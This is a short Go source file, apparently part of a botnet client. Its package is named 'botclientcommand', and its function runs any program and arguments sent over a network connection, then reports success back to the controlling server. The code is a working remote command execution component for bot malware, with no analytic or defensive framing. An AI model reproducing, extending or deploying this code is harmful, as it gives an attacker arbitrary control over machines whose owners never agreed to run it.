package botclientcommand

import (
	m "Misc"
	"net"
	"os/exec"
)

func cmd(command []string, cc net.Conn) {
	var msg string
	for i := 1; i < len(command); i++ {
		msg = msg + command[i] + " "
	}

	c := exec.Command(command[1], command[2:]...)
	if err := c.Run(); err != nil {
		m.Warning("Cannot Run Command", err)
	}
	sendToServer(cc, "[cmd] "+msg+"is succesfully executed")
}
